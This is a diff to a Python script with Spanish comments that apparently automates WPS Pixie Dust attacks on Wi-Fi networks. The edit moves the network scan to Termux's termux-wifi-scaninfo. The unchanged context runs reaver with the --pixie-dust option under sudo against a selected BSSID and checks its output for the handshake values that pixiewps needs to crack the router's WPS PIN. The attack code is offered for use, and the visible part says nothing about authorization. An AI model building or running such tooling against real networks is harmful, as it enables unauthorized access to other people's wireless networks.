@@ -1,4 +1,5 @@
 import subprocess
+import json
 
 def run_command(command, use_sudo=False):
     """Ejecuta un comando de shell y devuelve la salida."""
@@ -9,26 +10,24 @@ def run_command(command, use_sudo=False):
     return stdout.decode(), stderr.decode()
 
 def scan_wifi():
-    """Escanea redes Wi-Fi y devuelve una lista de SSID y BSSID."""
+    """Escanea redes Wi-Fi utilizando Termux y devuelve una lista de SSID y BSSID."""
     print("Escaneando redes Wi-Fi...\n")
-    stdout, _ = run_command("iw dev wlan0 scan | grep 'SSID\\|BSSID'")
-    networks = []
-    lines = stdout.splitlines()
-    current_bssid = None
-    for line in lines:
-        if "BSSID" in line:
-            current_bssid = line.split()[-1]
-        elif "SSID" in line:
-            ssid = line.split(":")[-1].strip()
-            if current_bssid and ssid:
-                networks.append((ssid, current_bssid))
-                current_bssid = None
-    return networks
+    stdout, stderr = run_command("termux-wifi-scaninfo", use_sudo=False)
+    
+    if stderr:
+        print(f"Error al escanear redes Wi-Fi: {stderr}")
+        return []
+
+    try:
+        networks = json.loads(stdout)
+        return [(net['ssid'], net['bssid']) for net in networks if 'ssid' in net and 'bssid' in net]
+    except json.JSONDecodeError:
+        print("Error al procesar la información del escaneo Wi-Fi.")
+        return []
 
 def perform_pixie_dust_attack(bssid):
     """Realiza el ataque Pixie Dust usando pixiewps."""
     print(f"\nIniciando ataque Pixie Dust en BSSID: {bssid}")
-    # Captura los valores necesarios con `reaver`
     stdout, stderr = run_command(f"reaver -i wlan0 -b {bssid} -vvv --pixie-dust", use_sudo=True)
     
     if "PKE" in stdout and "PKR" in stdout and "E-Hash1" in stdout and "E-Hash2" in stdout:
@@ -92,6 +91,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
 
